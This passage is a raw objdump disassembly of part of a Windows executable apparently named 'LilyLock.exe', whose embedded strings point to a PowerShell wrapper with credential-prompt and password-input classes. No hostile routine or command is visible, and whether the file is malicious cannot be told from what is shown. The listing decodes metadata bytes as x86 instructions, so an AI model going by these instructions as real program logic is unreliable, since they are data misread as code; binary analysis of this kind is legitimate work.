  406e5b:	00 b8 06 41 01 00    	add    %bh,0x14106(%eax)
  406e61:	00 c3                	add    %al,%bl
  406e63:	06                   	push   %es
  406e64:	46                   	inc    %esi
  406e65:	01 00                	add    %eax,(%eax)
  406e67:	00 d2                	add    %dl,%dl
  406e69:	06                   	push   %es
  406e6a:	4b                   	dec    %ebx
  406e6b:	01 00                	add    %eax,(%eax)
  406e6d:	00 dd                	add    %bl,%ch
  406e6f:	06                   	push   %es
  406e70:	3c 01                	cmp    $0x1,%al
  406e72:	00 00                	add    %al,(%eax)
  406e74:	ed                   	in     (%dx),%eax
  406e75:	06                   	push   %es
  406e76:	4f                   	dec    %edi
  406e77:	01 00                	add    %eax,(%eax)
  406e79:	00 fa                	add    %bh,%dl
  406e7b:	06                   	push   %es
  406e7c:	41                   	inc    %ecx
  406e7d:	01 00                	add    %eax,(%eax)
  406e7f:	00 10                	add    %dl,(%eax)
  406e81:	07                   	pop    %es
  406e82:	41                   	inc    %ecx
  406e83:	01 00                	add    %eax,(%eax)
  406e85:	00 1e                	add    %bl,(%esi)
  406e87:	07                   	pop    %es
  406e88:	46                   	inc    %esi
  406e89:	01 00                	add    %eax,(%eax)
  406e8b:	00 2d 07 41 01 00    	add    %ch,0x14107
  406e91:	00 38                	add    %bh,(%eax)
  406e93:	07                   	pop    %es
  406e94:	53                   	push   %ebx
  406e95:	01 00                	add    %eax,(%eax)
  406e97:	00 50 0c             	add    %dl,0xc(%eax)
  406e9a:	6e                   	outsb  %ds:(%esi),(%dx)
  406e9b:	02 00                	add    (%eax),%al
  406e9d:	00 90 0d ad 02 00    	add    %dl,0x2ad0d(%eax)
  406ea3:	00 9c 0d b2 02 00 00 	add    %bl,0x2b2(%ebp,%ecx,1)
  406eaa:	ab                   	stos   %eax,%es:(%edi)
  406eab:	0d b2 02 00 00       	or     $0x2b2,%eax
  406eb0:	bc 0d b8 02 00       	mov    $0x2b80d,%esp
  406eb5:	00 c7                	add    %al,%bh
  406eb7:	0d 53 01 00 00       	or     $0x153,%eax
  406ebc:	cc                   	int3
  406ebd:	0d be 02 00 00       	or     $0x2be,%eax
  406ec2:	1f                   	pop    %ds
  406ec3:	0d c3 02 00 00       	or     $0x2c3,%eax
  406ec8:	47                   	inc    %edi
  406ec9:	0a 3c 01             	or     (%ecx,%eax,1),%bh
  406ecc:	00 00                	add    %al,(%eax)
  406ece:	5c                   	pop    %esp
  406ecf:	0a 3c 01             	or     (%ecx,%eax,1),%bh
  406ed2:	00 00                	add    %al,(%eax)
  406ed4:	71 0a                	jno    0x406ee0
  406ed6:	3c 01                	cmp    $0x1,%al
  406ed8:	00 00                	add    %al,(%eax)
  406eda:	88 0a                	mov    %cl,(%edx)
  406edc:	3c 01                	cmp    $0x1,%al
  406ede:	00 00                	add    %al,(%eax)
  406ee0:	9f                   	lahf
  406ee1:	0a 3c 01             	or     (%ecx,%eax,1),%bh
  406ee4:	00 00                	add    %al,(%eax)
  406ee6:	b4 0a                	mov    $0xa,%ah
  406ee8:	3c 01                	cmp    $0x1,%al
  406eea:	00 00                	add    %al,(%eax)
  406eec:	c9                   	leave
  406eed:	0a 3c 01             	or     (%ecx,%eax,1),%bh
  406ef0:	00 00                	add    %al,(%eax)
  406ef2:	e0 0a                	loopne 0x406efe
  406ef4:	3c 01                	cmp    $0x1,%al
  406ef6:	00 00                	add    %al,(%eax)
  406ef8:	f7 0a 3c 01 00 00    	testl  $0x13c,(%edx)
  406efe:	0f 0b                	ud2
  406f00:	3c 01                	cmp    $0x1,%al
  406f02:	00 00                	add    %al,(%eax)
  406f04:	1b 10                	sbb    (%eax),%edx
  406f06:	4f                   	dec    %edi
  406f07:	01 00                	add    %eax,(%eax)
  406f09:	00 26                	add    %ah,(%esi)
  406f0b:	10 4b 01             	adc    %cl,0x1(%ebx)
  406f0e:	00 00                	add    %al,(%eax)
  406f10:	1b 10                	sbb    (%eax),%edx
  406f12:	4f                   	dec    %edi
  406f13:	01 00                	add    %eax,(%eax)
  406f15:	00 26                	add    %ah,(%esi)
  406f17:	10 4b 01             	adc    %cl,0x1(%ebx)
  406f1a:	02 00                	add    (%eax),%al
  406f1c:	05 00 03 00 01       	add    $0x1000300,%eax
  406f21:	00 06                	add    %al,(%esi)
  406f23:	00 03                	add    %al,(%ebx)
  406f25:	00 02                	add    %al,(%edx)
  406f27:	00 07                	add    %al,(%edi)
  406f29:	00 05 00 01 00 08    	add    %al,0x8000100
  406f2f:	00 05 00 02 00 09    	add    %al,0x9000200
  406f35:	00 07                	add    %al,(%edi)
  406f37:	00 01                	add    %al,(%ecx)
  406f39:	00 0a                	add    %cl,(%edx)
  406f3b:	00 07                	add    %al,(%edi)
  406f3d:	00 02                	add    %al,(%edx)
  406f3f:	00 0b                	add    %cl,(%ebx)
  406f41:	00 09                	add    %cl,(%ecx)
  406f43:	00 01                	add    %al,(%ecx)
  406f45:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406f48:	09 00                	or     %eax,(%eax)
  406f4a:	01 00                	add    %eax,(%eax)
  406f4c:	0f 00 0b             	str    (%ebx)
  406f4f:	00 02                	add    %al,(%edx)
  406f51:	00 0e                	add    %cl,(%esi)
  406f53:	00 0b                	add    %cl,(%ebx)
  406f55:	00 02                	add    %al,(%edx)
  406f57:	00 11                	add    %dl,(%ecx)
  406f59:	00 0d 00 02 00 12    	add    %cl,0x12000200
  406f5f:	00 0f                	add    %cl,(%edi)
  406f61:	00 02                	add    %al,(%edx)
  406f63:	00 13                	add    %dl,(%ebx)
  406f65:	00 11                	add    %dl,(%ecx)
  406f67:	00 02                	add    %al,(%edx)
  406f69:	00 18                	add    %bl,(%eax)
  406f6b:	00 13                	add    %dl,(%ebx)
  406f6d:	00 01                	add    %al,(%ecx)
  406f6f:	00 19                	add    %bl,(%ecx)
  406f71:	00 13                	add    %dl,(%ebx)
  406f73:	00 01                	add    %al,(%ecx)
  406f75:	00 1b                	add    %bl,(%ebx)
  406f77:	00 15 00 02 00 1a    	add    %dl,0x1a000200
  406f7d:	00 15 00 02 00 1c    	add    %dl,0x1c000200
  406f83:	00 17                	add    %dl,(%edi)
  406f85:	00 01                	add    %al,(%ecx)
  406f87:	00 1d 00 17 00 02    	add    %bl,0x2001700
  406f8d:	00 3f                	add    %bh,(%edi)
  406f8f:	00 19                	add    %bl,(%ecx)
  406f91:	00 02                	add    %al,(%edx)
  406f93:	00 4e 00             	add    %cl,0x0(%esi)
  406f96:	1b 00                	sbb    (%eax),%eax
  406f98:	02 00                	add    (%eax),%al
  406f9a:	4f                   	dec    %edi
  406f9b:	00 1d 00 02 00 50    	add    %bl,0x50000200
  406fa1:	00 1f                	add    %bl,(%edi)
  406fa3:	00 02                	add    %al,(%edx)
  406fa5:	00 51 00             	add    %dl,0x0(%ecx)
  406fa8:	21 00                	and    %eax,(%eax)
  406faa:	02 00                	add    (%eax),%al
  406fac:	52                   	push   %edx
  406fad:	00 23                	add    %ah,(%ebx)
  406faf:	00 02                	add    %al,(%edx)
  406fb1:	00 53 00             	add    %dl,0x0(%ebx)
  406fb4:	25 00 02 00 54       	and    $0x54000200,%eax
  406fb9:	00 27                	add    %ah,(%edi)
  406fbb:	00 02                	add    %al,(%edx)
  406fbd:	00 5b 00             	add    %bl,0x0(%ebx)
  406fc0:	29 00                	sub    %eax,(%eax)
  406fc2:	01 00                	add    %eax,(%eax)
  406fc4:	5c                   	pop    %esp
  406fc5:	00 29                	add    %ch,(%ecx)
  406fc7:	00 01                	add    %al,(%ecx)
  406fc9:	00 5e 00             	add    %bl,0x0(%esi)
  406fcc:	2b 00                	sub    (%eax),%eax
  406fce:	02 00                	add    (%eax),%al
  406fd0:	5d                   	pop    %ebp
  406fd1:	00 2b                	add    %ch,(%ebx)
  406fd3:	00 02                	add    %al,(%edx)
  406fd5:	00 5f 00             	add    %bl,0x0(%edi)
  406fd8:	2d 00 01 00 60       	sub    $0x60000100,%eax
  406fdd:	00 2d 00 01 00 62    	add    %ch,0x62000100
  406fe3:	00 2f                	add    %ch,(%edi)
  406fe5:	00 02                	add    %al,(%edx)
  406fe7:	00 61 00             	add    %ah,0x0(%ecx)
  406fea:	2f                   	das
  406feb:	00 02                	add    %al,(%edx)
  406fed:	00 63 00             	add    %ah,0x0(%ebx)
  406ff0:	31 00                	xor    %eax,(%eax)
  406ff2:	01 00                	add    %eax,(%eax)
  406ff4:	64 00 31             	add    %dh,%fs:(%ecx)
  406ff7:	00 02                	add    %al,(%edx)
  406ff9:	00 65 00             	add    %ah,0x0(%ebp)
  406ffc:	33 00                	xor    (%eax),%eax
  406ffe:	01 00                	add    %eax,(%eax)
  407000:	66 00 33             	data16 add %dh,(%ebx)
  407003:	00 02                	add    %al,(%edx)
  407005:	00 67 00             	add    %ah,0x0(%edi)
  407008:	35 00 01 00 68       	xor    $0x68000100,%eax
  40700d:	00 35 00 02 00 69    	add    %dh,0x69000200
  407013:	00 37                	add    %dh,(%edi)
  407015:	00 01                	add    %al,(%ecx)
  407017:	00 6a 00             	add    %ch,0x0(%edx)
  40701a:	37                   	aaa
  40701b:	00 01                	add    %al,(%ecx)
  40701d:	00 6c 00 39          	add    %ch,0x39(%eax,%eax,1)
  407021:	00 02                	add    %al,(%edx)
  407023:	00 6b 00             	add    %ch,0x0(%ebx)
  407026:	39 00                	cmp    %eax,(%eax)
  407028:	02 00                	add    (%eax),%al
  40702a:	6d                   	insl   (%dx),%es:(%edi)
  40702b:	00 3b                	add    %bh,(%ebx)
  40702d:	00 01                	add    %al,(%ecx)
  40702f:	00 6e 00             	add    %ch,0x0(%esi)
  407032:	3b 00                	cmp    (%eax),%eax
  407034:	01 00                	add    %eax,(%eax)
  407036:	70 00                	jo     0x407038
  407038:	3d 00 02 00 6f       	cmp    $0x6f000200,%eax
  40703d:	00 3d 00 02 00 71    	add    %bh,0x71000200
  407043:	00 3f                	add    %bh,(%edi)
  407045:	00 01                	add    %al,(%ecx)
  407047:	00 72 00             	add    %dh,0x0(%edx)
  40704a:	3f                   	aas
  40704b:	00 02                	add    %al,(%edx)
  40704d:	00 73 00             	add    %dh,0x0(%ebx)
  407050:	41                   	inc    %ecx
  407051:	00 01                	add    %al,(%ecx)
  407053:	00 74 00 41          	add    %dh,0x41(%eax,%eax,1)
  407057:	00 02                	add    %al,(%edx)
  407059:	00 75 00             	add    %dh,0x0(%ebp)
  40705c:	43                   	inc    %ebx
  40705d:	00 01                	add    %al,(%ecx)
  40705f:	00 76 00             	add    %dh,0x0(%esi)
  407062:	43                   	inc    %ebx
  407063:	00 0c 14             	add    %cl,(%esp,%edx,1)
  407066:	45                   	inc    %ebp
  407067:	15 ff 1b 26 03       	adc    $0x3261bff,%eax
  40706c:	08 04 19             	or     %al,(%ecx,%ebx,1)
  40706f:	04 ab                	add    $0xab,%al
  407071:	04 41                	add    $0x41,%al
  407073:	05 49 05 51 05       	add    $0x5510549,%eax
  407078:	95                   	xchg   %eax,%ebp
  407079:	06                   	push   %es
  40707a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40707b:	06                   	push   %es
  40707c:	e0 06                	loopne 0x407084
  40707e:	f5                   	cmc
  40707f:	06                   	push   %es
  407080:	04 01                	add    $0x1,%al
  407082:	03 00                	add    (%eax),%eax
  407084:	f5                   	cmc
  407085:	01 01                	add    %eax,(%ecx)
  407087:	00 04 02             	add    %al,(%edx,%eax,1)
  40708a:	3f                   	aas
  40708b:	00 44 07 02          	add    %al,0x2(%edi,%eax,1)
  40708f:	00 00                	add    %al,(%eax)
  407091:	01 4b 00             	add    %ecx,0x0(%ebx)
  407094:	a1 07 02 00 00       	mov    0x207,%eax
  407099:	01 69 00             	add    %ebp,0x0(%ecx)
  40709c:	6d                   	insl   (%dx),%es:(%edi)
  40709d:	09 03                	or     %eax,(%ebx)
  40709f:	00 00                	add    %al,(%eax)
  4070a1:	01 6b 00             	add    %ebp,0x0(%ebx)
  4070a4:	7a 09                	jp     0x4070af
  4070a6:	03 00                	add    (%eax),%eax
  4070a8:	04 80                	add    $0x80,%al
	...
  4070ba:	f0 13 00             	lock adc (%eax),%eax
  4070bd:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4070c8:	00 00                	add    %al,(%eax)
  4070ca:	01 00                	add    %eax,(%eax)
  4070cc:	2a 01                	sub    (%ecx),%al
  4070ce:	00 00                	add    %al,(%eax)
  4070d0:	00 00                	add    %al,(%eax)
  4070d2:	03 00                	add    (%eax),%eax
	...
  4070dc:	00 00                	add    %al,(%eax)
  4070de:	0a 00                	or     (%eax),%al
  4070e0:	50                   	push   %eax
  4070e1:	01 00                	add    %eax,(%eax)
  4070e3:	00 00                	add    %al,(%eax)
  4070e5:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4070f0:	00 00                	add    %al,(%eax)
  4070f2:	01 00                	add    %eax,(%eax)
  4070f4:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4070f5:	01 00                	add    %eax,(%eax)
  4070f7:	00 00                	add    %al,(%eax)
  4070f9:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407104:	00 00                	add    %al,(%eax)
  407106:	01 00                	add    %eax,(%eax)
  407108:	33 01                	xor    (%ecx),%eax
  40710a:	00 00                	add    %al,(%eax)
  40710c:	00 00                	add    %al,(%eax)
  40710e:	04 00                	add    $0x0,%al
	...
  407118:	00 00                	add    %al,(%eax)
  40711a:	b2 01                	mov    $0x1,%dl
  40711c:	84 08                	test   %cl,(%eax)
	...
  407126:	01 00                	add    %eax,(%eax)
  407128:	00 00                	add    %al,(%eax)
  40712a:	62 22                	bound  %esp,(%edx)
  40712c:	00 00                	add    %al,(%eax)
  40712e:	03 00                	add    (%eax),%eax
  407130:	02 00                	add    (%eax),%al
  407132:	04 00                	add    $0x0,%al
  407134:	02 00                	add    (%eax),%al
  407136:	05 00 02 00 06       	add    $0x6000200,%eax
  40713b:	00 02                	add    %al,(%edx)
  40713d:	00 0b                	add    %cl,(%ebx)
  40713f:	00 0a                	add    %cl,(%edx)
  407141:	00 0d 00 0c 00 0f    	add    %cl,0xf000c00
  407147:	00 0e                	add    %cl,(%esi)
  407149:	00 10                	add    %dl,(%eax)
  40714b:	00 0e                	add    %cl,(%esi)
  40714d:	00 13                	add    %dl,(%ebx)
  40714f:	00 12                	add    %dl,(%edx)
  407151:	00 16                	add    %dl,(%esi)
  407153:	00 15 00 1d 00 ff    	add    %dl,0xff001d00
  407159:	02 2b                	add    (%ebx),%ch
  40715b:	02 97 07 00 00 00    	add    0x7(%edi),%dl
  407161:	3c 4d                	cmp    $0x4d,%al
  407163:	6f                   	outsl  %ds:(%esi),(%dx)
  407164:	64 75 6c             	fs jne 0x4071d3
  407167:	65 3e 00 4c 69 6c    	gs add %cl,%ds:0x6c(%ecx,%ebp,2)
  40716d:	79 4c                	jns    0x4071bb
  40716f:	6f                   	outsl  %ds:(%esi),(%dx)
  407170:	63 6b 2e             	arpl   %ebp,0x2e(%ebx)
  407173:	65 78 65             	gs js  0x4071db
  407176:	00 43 72             	add    %al,0x72(%ebx)
  407179:	65 64 65 6e          	gs fs outsb %gs:(%esi),(%dx)
  40717d:	74 69                	je     0x4071e8
  40717f:	61                   	popa
  407180:	6c                   	insb   (%dx),%es:(%edi)
  407181:	5f                   	pop    %edi
  407182:	46                   	inc    %esi
  407183:	6f                   	outsl  %ds:(%esi),(%dx)
  407184:	72 6d                	jb     0x4071f3
  407186:	00 4d 6f             	add    %cl,0x6f(%ebp)
  407189:	64 75 6c             	fs jne 0x4071f8
  40718c:	65 4e                	gs dec %esi
  40718e:	61                   	popa
  40718f:	6d                   	insl   (%dx),%es:(%edi)
  407190:	65 53                	gs push %ebx
  407192:	70 61                	jo     0x4071f5
  407194:	63 65 00             	arpl   %esp,0x0(%ebp)
  407197:	43                   	inc    %ebx
  407198:	52                   	push   %edx
  407199:	45                   	inc    %ebp
  40719a:	44                   	inc    %esp
  40719b:	55                   	push   %ebp
  40719c:	49                   	dec    %ecx
  40719d:	5f                   	pop    %edi
  40719e:	49                   	dec    %ecx
  40719f:	4e                   	dec    %esi
  4071a0:	46                   	inc    %esi
  4071a1:	4f                   	dec    %edi
  4071a2:	00 43 52             	add    %al,0x52(%ebx)
  4071a5:	45                   	inc    %ebp
  4071a6:	44                   	inc    %esp
  4071a7:	55                   	push   %ebp
  4071a8:	49                   	dec    %ecx
  4071a9:	5f                   	pop    %edi
  4071aa:	46                   	inc    %esi
  4071ab:	4c                   	dec    %esp
  4071ac:	41                   	inc    %ecx
  4071ad:	47                   	inc    %edi
  4071ae:	53                   	push   %ebx
  4071af:	00 43 72             	add    %al,0x72(%ebx)
  4071b2:	65 64 55             	gs fs push %ebp
  4071b5:	49                   	dec    %ecx
  4071b6:	5f                   	pop    %edi
  4071b7:	52                   	push   %edx
  4071b8:	65 74 75             	gs je  0x407230
  4071bb:	72 6e                	jb     0x40722b
  4071bd:	43                   	inc    %ebx
  4071be:	6f                   	outsl  %ds:(%esi),(%dx)
  4071bf:	64 65 73 00          	fs gs jae 0x4071c3
  4071c3:	55                   	push   %ebp
  4071c4:	73 65                	jae    0x40722b
  4071c6:	72 5f                	jb     0x407227
  4071c8:	50                   	push   %eax
  4071c9:	77 64                	ja     0x40722f
  4071cb:	00 4d 61             	add    %cl,0x61(%ebp)
  4071ce:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  4071d5:	65 52                	gs push %edx
  4071d7:	61                   	popa
  4071d8:	77 55                	ja     0x40722f
  4071da:	49                   	dec    %ecx
  4071db:	00 49 6e             	add    %cl,0x6e(%ecx)
  4071de:	70 75                	jo     0x407255
  4071e0:	74 5f                	je     0x407241
  4071e2:	42                   	inc    %edx
  4071e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4071e4:	78 00                	js     0x4071e6
  4071e6:	43                   	inc    %ebx
  4071e7:	68 6f 69 63 65       	push   $0x6563696f
  4071ec:	5f                   	pop    %edi
  4071ed:	42                   	inc    %edx
  4071ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4071ef:	78 00                	js     0x4071f1
  4071f1:	52                   	push   %edx
  4071f2:	65 61                	gs popa
  4071f4:	64 4b                	fs dec %ebx
  4071f6:	65 79 5f             	gs jns 0x407258
  4071f9:	42                   	inc    %edx
  4071fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4071fb:	78 00                	js     0x4071fd
  4071fd:	4b                   	dec    %ebx
  4071fe:	65 79 62             	gs jns 0x407263
  407201:	6f                   	outsl  %ds:(%esi),(%dx)
  407202:	61                   	popa
  407203:	72 64                	jb     0x407269
  407205:	5f                   	pop    %edi
  407206:	46                   	inc    %esi
  407207:	6f                   	outsl  %ds:(%esi),(%dx)
  407208:	72 6d                	jb     0x407277
  40720a:	00 50 72             	add    %dl,0x72(%eax)
  40720d:	6f                   	outsl  %ds:(%esi),(%dx)
  40720e:	67 72 65             	addr16 jb 0x407276
  407211:	73 73                	jae    0x407286
  407213:	5f                   	pop    %edi
  407214:	46                   	inc    %esi
  407215:	6f                   	outsl  %ds:(%esi),(%dx)
  407216:	72 6d                	jb     0x407285
  407218:	00 50 72             	add    %dl,0x72(%eax)
  40721b:	6f                   	outsl  %ds:(%esi),(%dx)
  40721c:	67 72 65             	addr16 jb 0x407284
  40721f:	73 73                	jae    0x407294
  407221:	5f                   	pop    %edi
  407222:	44                   	inc    %esp
  407223:	61                   	popa
  407224:	74 61                	je     0x407287
  407226:	00 43 6f             	add    %al,0x6f(%ebx)
  407229:	6e                   	outsb  %ds:(%esi),(%dx)
  40722a:	73 6f                	jae    0x40729b
  40722c:	6c                   	insb   (%dx),%es:(%edi)
  40722d:	65 5f                	gs pop %edi
  40722f:	49                   	dec    %ecx
  407230:	6e                   	outsb  %ds:(%esi),(%dx)
  407231:	66 6f                	outsw  %ds:(%esi),(%dx)
  407233:	00 46 69             	add    %al,0x69(%esi)
  407236:	6c                   	insb   (%dx),%es:(%edi)
  407237:	65 54                	gs push %esp
  407239:	79 70                	jns    0x4072ab
  40723b:	65 00 53 54          	add    %dl,%gs:0x54(%ebx)
  40723f:	44                   	inc    %esp
  407240:	48                   	dec    %eax
  407241:	61                   	popa
  407242:	6e                   	outsb  %ds:(%esi),(%dx)
  407243:	64 6c                	fs insb (%dx),%es:(%edi)
  407245:	65 00 4d 61          	add    %cl,%gs:0x61(%ebp)
  407249:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  407250:	65 55                	gs push %ebp
  407252:	49                   	dec    %ecx
  407253:	00 4d 61             	add    %cl,0x61(%ebp)
  407256:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  40725d:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  407261:	6e                   	outsb  %ds:(%esi),(%dx)
  407262:	73 6f                	jae    0x4072d3
  407264:	6c                   	insb   (%dx),%es:(%edi)
  407265:	65 43                	gs inc %ebx
  407267:	6f                   	outsl  %ds:(%esi),(%dx)
  407268:	6c                   	insb   (%dx),%es:(%edi)
  407269:	6f                   	outsl  %ds:(%esi),(%dx)
  40726a:	72 50                	jb     0x4072bc
  40726c:	72 6f                	jb     0x4072dd
  40726e:	78 79                	js     0x4072e9
  407270:	00 4d 61             	add    %cl,0x61(%ebp)
  407273:	69 6e 41 70 70 49 6e 	imul   $0x6e497070,0x41(%esi),%ebp
  40727a:	74 65                	je     0x4072e1
  40727c:	72 66                	jb     0x4072e4
  40727e:	61                   	popa
  40727f:	63 65 00             	arpl   %esp,0x0(%ebp)
  407282:	4d                   	dec    %ebp
  407283:	61                   	popa
  407284:	69 6e 41 70 70 00 6d 	imul   $0x6d007070,0x41(%esi),%ebp
  40728b:	73 63                	jae    0x4072f0
  40728d:	6f                   	outsl  %ds:(%esi),(%dx)
  40728e:	72 6c                	jb     0x4072fc
  407290:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  407297:	65 6d                	gs insl (%dx),%es:(%edi)
  407299:	00 4f 62             	add    %cl,0x62(%edi)
  40729c:	6a 65                	push   $0x65
  40729e:	63 74 00 56          	arpl   %esi,0x56(%eax,%eax,1)
  4072a2:	61                   	popa
  4072a3:	6c                   	insb   (%dx),%es:(%edi)
  4072a4:	75 65                	jne    0x40730b
  4072a6:	54                   	push   %esp
  4072a7:	79 70                	jns    0x407319
  4072a9:	65 00 45 6e          	add    %al,%gs:0x6e(%ebp)
  4072ad:	75 6d                	jne    0x40731c
  4072af:	00 53 79             	add    %dl,0x79(%ebx)
  4072b2:	73 74                	jae    0x407328
  4072b4:	65 6d                	gs insl (%dx),%es:(%edi)
  4072b6:	2e 4d                	cs dec %ebp
  4072b8:	61                   	popa
  4072b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4072ba:	61                   	popa
  4072bb:	67 65 6d             	gs insl (%dx),%es:(%di)
  4072be:	65 6e                	outsb  %gs:(%esi),(%dx)
  4072c0:	74 2e                	je     0x4072f0
  4072c2:	41                   	inc    %ecx
  4072c3:	75 74                	jne    0x407339
  4072c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4072c6:	6d                   	insl   (%dx),%es:(%edi)
  4072c7:	61                   	popa
  4072c8:	74 69                	je     0x407333
  4072ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4072cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4072cc:	00 53 79             	add    %dl,0x79(%ebx)
  4072cf:	73 74                	jae    0x407345
  4072d1:	65 6d                	gs insl (%dx),%es:(%edi)
  4072d3:	2e 4d                	cs dec %ebp
  4072d5:	61                   	popa
  4072d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4072d7:	61                   	popa
  4072d8:	67 65 6d             	gs insl (%dx),%es:(%di)
  4072db:	65 6e                	outsb  %gs:(%esi),(%dx)
  4072dd:	74 2e                	je     0x40730d
  4072df:	41                   	inc    %ecx
  4072e0:	75 74                	jne    0x407356
  4072e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4072e3:	6d                   	insl   (%dx),%es:(%edi)
  4072e4:	61                   	popa
  4072e5:	74 69                	je     0x407350
  4072e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4072e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4072e9:	2e 48                	cs dec %eax
  4072eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4072ec:	73 74                	jae    0x407362
  4072ee:	00 50 53             	add    %dl,0x53(%eax)
  4072f1:	48                   	dec    %eax
  4072f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4072f3:	73 74                	jae    0x407369
  4072f5:	52                   	push   %edx
  4072f6:	61                   	popa
  4072f7:	77 55                	ja     0x40734e
  4072f9:	73 65                	jae    0x407360
  4072fb:	72 49                	jb     0x407346
  4072fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4072fe:	74 65                	je     0x407365
  407300:	72 66                	jb     0x407368
  407302:	61                   	popa
  407303:	63 65 00             	arpl   %esp,0x0(%ebp)
  407306:	53                   	push   %ebx
  407307:	79 73                	jns    0x40737c
  407309:	74 65                	je     0x407370
  40730b:	6d                   	insl   (%dx),%es:(%edi)
  40730c:	2e 57                	cs push %edi
  40730e:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  407315:	46                   	inc    %esi
  407316:	6f                   	outsl  %ds:(%esi),(%dx)
  407317:	72 6d                	jb     0x407386
  407319:	73 00                	jae    0x40731b
  40731b:	46                   	inc    %esi
  40731c:	6f                   	outsl  %ds:(%esi),(%dx)
  40731d:	72 6d                	jb     0x40738c
  40731f:	00 50 53             	add    %dl,0x53(%eax)
  407322:	48                   	dec    %eax
  407323:	6f                   	outsl  %ds:(%esi),(%dx)
  407324:	73 74                	jae    0x40739a
  407326:	55                   	push   %ebp
  407327:	73 65                	jae    0x40738e
  407329:	72 49                	jb     0x407374
  40732b:	6e                   	outsb  %ds:(%esi),(%dx)
  40732c:	74 65                	je     0x407393
  40732e:	72 66                	jb     0x407396
  407330:	61                   	popa
  407331:	63 65 00             	arpl   %esp,0x0(%ebp)
  407334:	50                   	push   %eax
  407335:	53                   	push   %ebx
  407336:	48                   	dec    %eax
  407337:	6f                   	outsl  %ds:(%esi),(%dx)
  407338:	73 74                	jae    0x4073ae
  40733a:	00 53 79             	add    %dl,0x79(%ebx)
  40733d:	73 74                	jae    0x4073b3
  40733f:	65 6d                	gs insl (%dx),%es:(%edi)
  407341:	2e 54                	cs push %esp
  407343:	65 78 74             	gs js  0x4073ba
  407346:	00 53 74             	add    %dl,0x74(%ebx)
  407349:	72 69                	jb     0x4073b4
  40734b:	6e                   	outsb  %ds:(%esi),(%dx)
  40734c:	67 42                	addr16 inc %edx
  40734e:	75 69                	jne    0x4073b9
  407350:	6c                   	insb   (%dx),%es:(%edi)
  407351:	64 65 72 00          	fs gs jb 0x407355
  407355:	43                   	inc    %ebx
  407356:	72 65                	jb     0x4073bd
  407358:	64 55                	fs push %ebp
  40735a:	49                   	dec    %ecx
  40735b:	50                   	push   %eax
  40735c:	72 6f                	jb     0x4073cd
  40735e:	6d                   	insl   (%dx),%es:(%edi)
  40735f:	70 74                	jo     0x4073d5
  407361:	46                   	inc    %esi
  407362:	6f                   	outsl  %ds:(%esi),(%dx)
  407363:	72 43                	jb     0x4073a8
  407365:	72 65                	jb     0x4073cc
  407367:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  40736a:	74 69                	je     0x4073d5
  40736c:	61                   	popa
  40736d:	6c                   	insb   (%dx),%es:(%edi)
  40736e:	73 00                	jae    0x407370
  407370:	50                   	push   %eax
  407371:	53                   	push   %ebx
  407372:	43                   	inc    %ebx
  407373:	72 65                	jb     0x4073da
  407375:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  407378:	74 69                	je     0x4073e3
  40737a:	61                   	popa
  40737b:	6c                   	insb   (%dx),%es:(%edi)
  40737c:	54                   	push   %esp
  40737d:	79 70                	jns    0x4073ef
  40737f:	65 73 00             	gs jae 0x407382
  407382:	50                   	push   %eax
  407383:	53                   	push   %ebx
  407384:	43                   	inc    %ebx
  407385:	72 65                	jb     0x4073ec
  407387:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  40738a:	74 69                	je     0x4073f5
  40738c:	61                   	popa
  40738d:	6c                   	insb   (%dx),%es:(%edi)
  40738e:	55                   	push   %ebp
  40738f:	49                   	dec    %ecx
  407390:	4f                   	dec    %edi
  407391:	70 74                	jo     0x407407
  407393:	69 6f 6e 73 00 50 72 	imul   $0x72500073,0x6e(%edi),%ebp
  40739a:	6f                   	outsl  %ds:(%esi),(%dx)
  40739b:	6d                   	insl   (%dx),%es:(%edi)
  40739c:	70 74                	jo     0x407412
  40739e:	46                   	inc    %esi
  40739f:	6f                   	outsl  %ds:(%esi),(%dx)
  4073a0:	72 50                	jb     0x4073f2
  4073a2:	61                   	popa
  4073a3:	73 73                	jae    0x407418
  4073a5:	77 6f                	ja     0x407416
  4073a7:	72 64                	jb     0x40740d
  4073a9:	00 2e                	add    %ch,(%esi)
  4073ab:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  4073af:	00 63 62             	add    %ah,0x62(%ebx)
  4073b2:	53                   	push   %ebx
  4073b3:	69 7a 65 00 68 77 6e 	imul   $0x6e776800,0x65(%edx),%edi
  4073ba:	64 50                	fs push %eax
  4073bc:	61                   	popa
  4073bd:	72 65                	jb     0x407424
  4073bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4073c0:	74 00                	je     0x4073c2
  4073c2:	70 73                	jo     0x407437
  4073c4:	7a 4d                	jp     0x407413
  4073c6:	65 73 73             	gs jae 0x40743c
  4073c9:	61                   	popa
  4073ca:	67 65 54             	addr16 gs push %esp
  4073cd:	65 78 74             	gs js  0x407444
